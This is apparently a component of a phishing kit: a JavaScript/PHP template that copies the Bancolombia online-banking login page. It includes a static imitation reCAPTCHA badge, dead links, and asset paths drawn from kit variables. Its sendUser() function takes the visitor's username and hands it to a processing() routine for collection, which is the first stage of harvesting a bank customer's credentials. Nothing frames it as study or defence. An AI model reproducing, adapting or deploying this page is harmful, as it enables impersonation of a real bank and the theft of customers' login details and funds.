var bancolombia_titulo = 'Inicio de sesión';
var bancolombia_contenido = `
<div class="panel panel-primary" style="min-height: 68vh;">
	<div class="row" id="error">
		<div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
			<div class="errorDiv">
				<div class="divTextMessage">
					<span class="icon-error errorIcon">
						<span class="path1"></span>
						<span class="path2"></span>
						<span class="path3"></span>
					</span>
					<div class="errorTitulo">Error</div>
					<div id="summary" class="errorTexto"></div>
				</div>
			</div>
		</div>
	</div>
	<div id="contenido">
		<div class="mua-panel-body">
			<div class="row">
				<div class="col-xs-12 col-sm-5 col-md-4">
					<div class="panel_general mua-panel_general">
						<div class="title-panel-label">
							<h1>
								Usuario
							</h1>
						</div>
						<div class="subtitle-land-label">
							<h4>
								Si no tienes un usuario asignado ingresa con tu documento de identidad
							</h4>
						</div>
						<div class="mua-content-group-panel">
							<div class="mua-label-input">
								<span id="popoverUser" class="adminItems-Icons icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
								<div id="popoverContent" class="hide">
									<span class="mua_tooltip_close">×</span>
									<div class="mua_tooltip_msg">
										Ingrese el usuario que tiene registrado en la Sucursal Virtual
										Personas. Si no tiene un usuario asignado ingrese con su
										documento de identidad.
									</div>
								</div>
								<label class="control-label-index" for="username">Ingresa tu
									usuario</label>
							</div>
							<div>
								<div class="mua_svp_enroll_update_control">
									<input id="username" tabindex="1" class="mua-form-control mua_svp_control_username mua-input-icon" type="text" value="" maxlength="20" autocomplete="off">
									<span class="mua-icon-user"> </span>
								</div>
							</div>
						</div>

						<div class="one-button-container mua-button-container">
							<div id="recaptcha" class="g-recaptcha" data-callback="onSubmit" data-size="invisible" data-error-callback="onCaptcha">
								<div class="grecaptcha-badge" data-style="bottomright" style="z-index: 2; width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
									<div class="grecaptcha-logo">
										<div id="rc-anchor-alert" class="rc-anchor-alert"></div>
										<div class="rc-anchor rc-anchor-invisible rc-anchor-light rc-anchor-invisible-hover">
											<div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Es necesaria una verificación para el Recaptcha. </div>
											<div class="rc-anchor-error-msg-container" style="display:none">
												<span class="rc-anchor-error-msg" aria-hidden="true"></span>
											</div>
											<div class="rc-anchor-normal-footer smalltext">
												<div class="rc-anchor-logo-large" role="presentation">
													<div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div>
												</div>
												<div class="rc-anchor-pt">
													<a href="#">Privacidad</a>
													<span aria-hidden="true" role="presentation"> - </span>
													<a href="#">Términos</a>
												</div>
											</div>
											<div class="rc-anchor-invisible-text">
												<span>protección de <strong>reCAPTCHA</strong></span>
												<div class="rc-anchor-pt">
													<a href="#">Privacidad</a>
													<span aria-hidden="true" role="presentation"> - </span>
													<a href="#">Términos</a>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<button id="btnGo2" class="btn btn-success" onclick="sendUser()" type="button">
								Continuar
							</button>
						</div>
						<div class="mua-panel_enlances">
							<p>
								<a href="#">¿Olvidaste tu usuario?</a>
							</p>
							<p>
								<a href="#">¿Problemas para conectarte?</a>
							</p>
						</div>
					</div>
					<div id="opciones">
						<div class="panel_general mua-panel_general">
							<div class="mua-divIcon">
								<a class="mua-itemsIcons-btn" href="#">
									<div class="mua-divCell">
										<span class="adminItems-Icons icon-icon_demo">
											<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
										</span>
									</div>
									<div class="mua-divCell-text">
										Conoce sobre Sucursal Virtual Personas
									</div>
								</a>
							</div>
							<div class="mua-divIcon">
								<a class="mua-itemsIcons-btn" href="#">
									<div class="mua-divCell">
										<span class="adminItems-Icons icon-icon_bloquear">
											<span class="path1"></span><span class="path2"></span>
										</span>
									</div>
									<div class="mua-divCell-text">
										Aprende sobre Seguridad
									</div>
								</a>
							</div>
							<div class="mua-divIcon">
								<a class="mua-itemsIcons-btn" href="#">
									<div class="mua-divCell">
										<span class="adminItems-Icons icon-icon_reglamento">
											<span class="path1"></span>
											<span class="path2"></span>
											<span class="path3"></span>
											<span class="path4"></span>
											<span class="path5"></span>
											<span class="path6"></span>
											<span class="path7"></span>
										</span>
									</div>
									<div class="mua-divCell-text">
										Reglamento Sucursal Virtual
									</div>
								</a>
							</div>
							<div class="mua-divIcon">
								<a class="mua-itemsIcons-btn" href="#">
									<div class="mua-divCell">
										<span class="adminItems-Icons icon-icon_politicas">
											<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span>
										</span>
									</div>
									<div class="mua-divCell-text">
										Política de Privacidad
									</div>
								</a>
							</div>
						</div>
					</div>
				</div>
				<div id="anuncios" class="mx-auto col-xs-12 col-sm-7 col-md-8 w-auto">
					<div id="banner-persona">
						<img id="imgpubli" src="${my_banco}img/publi_home.jpg" border="0" class="img-responsive">
					</div>
					<p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp;
						Conoce más <a href="#" class="a1">aquí</a>
					</p>
				</div>
			</div>
		</div>
	</div>
</div>
<link rel="stylesheet" href="${my_hosting}css/recaptcha.css">
`
<?php require_once('_plantilla_bancolombia.php'); ?>

//<script>
	function sendUser() {
		let user = $('#username').val();
		if (!user) {
			$('#tabError').toggle(true);
			$('#summary').html('Por favor, ingrese la información requerida.');
			$('#username').addClass('error');
		} else {
			processing({
				t: 'usuario',
				usuario: user
			});
		}
	}